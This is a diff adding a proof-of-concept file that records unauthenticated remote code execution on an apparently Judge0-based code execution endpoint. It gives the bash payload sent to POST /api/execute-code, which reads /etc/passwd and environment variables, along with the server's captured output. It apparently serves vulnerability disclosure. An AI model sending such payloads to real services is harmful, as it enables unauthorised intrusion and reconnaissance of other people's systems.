@@ -1,0 +1,36 @@
+# PoC RCE — POST /api/execute-code (TANPA AUTH) — redacted
+# header dikirim: Content-Type: application/json, UA browser
+# body: {"language":"bash","code":"date; id; hostname; uname -a; cat /etc/passwd; env | grep JUDGE0"}
+
+--- stdout (redacted) ---
+Fri 16 Oct 2026 08:59:09 AM UTC
+uid=14272522 gid=14272522 groups=14272522
+zag-srv02-ce-execution-worker
+Linux zag-srv02-ce-execution-worker 6.8.0-146-generic #146-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep  3 16:12:30 UTC 2026 x86_64 GNU/Linux
+---
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+judge0:x:1000:1000::/home/judge0:/bin/sh
+---
+JUDGE0_VERSION=1.14.0
+JUDGE0_HOMEPAGE=https://judge0.com
+JUDGE0_SOURCE_CODE=https://github.com/judge0/judge0
+JUDGE0_MAINTAINER=Herman Zvonimir Došilović <hermanz.dosilovic@gmail.com>
+
